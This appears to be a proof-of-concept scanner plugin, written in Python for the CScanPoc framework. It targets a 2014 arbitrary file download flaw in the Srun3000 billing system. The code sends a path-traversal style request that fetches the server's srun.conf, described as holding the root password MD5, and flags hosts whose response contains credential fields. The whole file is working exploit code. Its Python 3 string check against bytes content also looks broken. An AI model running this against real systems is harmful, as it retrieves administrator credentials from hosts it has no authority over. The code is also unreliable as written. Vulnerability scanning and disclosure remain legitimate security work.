# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Srun_0001'  # 平台漏洞编号，留空
    name = 'Srun3000计费系统 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-07-07'  # 漏洞公布时间
    desc = '''
        配置文件下载，内有root密码md5
        漏洞文件，
        /srun3/srun/services/modules/login/controller/login_controller.php
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=067666'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '深澜计费引擎'  # 漏洞应用名称
    product_version = 'Srun3000 [3.00rc14.17.4]'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'afe186a0-8b58-49df-baa9-8610dab702df'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref:http://wooyun.org/bugs/wooyun-2014-067666
            payload = '/index.php?action=login&ts=download&file=/srun3/etc/srun.conf'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if 'username' in content and 'root_pass' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
